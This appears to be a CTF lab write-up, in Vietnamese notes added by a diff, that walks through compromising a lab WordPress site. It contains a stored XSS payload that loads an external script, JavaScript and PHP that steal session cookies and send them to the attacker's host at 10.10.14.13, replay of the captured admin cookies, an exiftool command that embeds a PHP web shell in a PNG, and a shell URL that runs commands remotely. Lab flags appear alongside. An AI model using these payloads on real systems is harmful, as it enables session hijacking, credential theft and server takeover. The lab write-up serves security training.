@@ -1,0 +1,108 @@
+step1:
+
+
+xac dinh duoc endpoint nay
+http://www.trilocor.local/index.php/testimonials/
+(anh0)
+tac dung la gui tin den server
+
+=> toi thu payload xss
+
+'>"><script src=http://10.10.14.13:8000/xsscookiesteal.js></script>
+
+
+
+cho tat ca cac muc trong form 
+
+=> muc sdt bi loc (bo qua sdt)
+
+=> step 2: thu gui tin den host server
+
+php -S 0.0.0.0:8000   (IP evil 10.10.14.13)
+
+HOST FILE 
+=> xsscookiesteal.js [
+new Image().src="http://10.10.14.13:8000/xsscookiesteal.php?c="+document.cookie;
+new Image().src = "http://10.10.14.13:8000/?ua=" + navigator.userAgent + "&ref=" + document.referrer;
+]
+
+=> xsscookiesteal.php [
+<?php
+if (isset($_GET['c'])) {
+    $list = explode(";", $_GET['c']);
+    foreach ($list as $key => $value) {
+        $cookie = urldecode($value);
+        $file = fopen("cookies.txt", "a+");
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
+        fclose($file);
+    }
+}
+?>
+]
+(anh1)
+(anh2)
+
+=> server xac nhan thanh cong => cookie steall + user agent
+
+GET /xsscookiesteal.php?c=wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1753803333%7C94BQKKdpyk07yG4Es4kvtujfrZvSo2egRFkPixgIVj2%7Cf4489bc81a678a589f56f835b5b1ec328af4a35e678909b392e9928f2a53361d;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1753803333%7C94BQKKdpyk07yG4Es4kvtujfrZvSo2egRFkPixgIVj2%7C65b65a8c54664ff45bbe236da2e3c0d6b372bfda413b76b224465bbaf7048096;%20wordpress_test_cookie=WP%20Cookie%20check            
+
+
+phat hien user-agent phai la HTB/1.0
+
+
+
+        
+=> step 3 : gia mao coookie
++ add cookie follow 
+wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1753803333%7C94BQKKdpyk07yG4Es4kvtujfrZvSo2egRFkPixgIVj2%7Cf4489bc81a678a589f56f835b5b1ec328af4a35e678909b392e9928f2a53361d;
+
+wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1753803333%7C94BQKKdpyk07yG4Es4kvtujfrZvSo2egRFkPixgIVj2%7C65b65a8c54664ff45bbe236da2e3c0d6b372bfda413b76b224465bbaf7048096;
+
+wordpress_test_cookie=WP%20Cookie%20check 
+
+(anh3)
+
+=> got stuck cant visit login
+
+=> read source
+
+=> phat hien ra domain http://admin.trilocor.local/
+
+=> visit thu http://admin.trilocor.local/wp-login.php?
+
+=> + lam gia cookie + reload
+(anh4)
+(anh5)
+
+=> COMPLETE hijacking session cookie
+
+Flag: bc24d33da685638bcd7ae5c8baaf9ad0 (noi tim duoc admin.trilocor.local/wp-admin/)
+
+=> tim dc endpoint upload file: http://admin.trilocor.local/wp-admin/upload.php
+                           
+
+                                                                    
+su dung cong cu tao payload shell voi duoi file png
+```
+exiftool -Comment='<?php system($_GET["cmd"]); ?>' 0.png -o shell.php.png
+```
+
+=> tai len thanh cong
+(anh6)
+
+(anh7)
+=> truy cap file manager phat hien chuc nagn rename => rename de thanh shell.php :)) 
+
+
+=> truy cap file va thuc thi rce 
+(HINH 8)
+
+=> http://www.trilocor.local/wp-content/uploads/2025/07/shell.php?cmd=ls;cd%20/;cat${IFS}c07afe19b9912fc14e493e4d26f9e97d.txt
+(HINH 9)
+
+=> FLAG: 7854de9dc738a7a3051e18b87eddfe67  /root direct  /
+
+
+
+
+
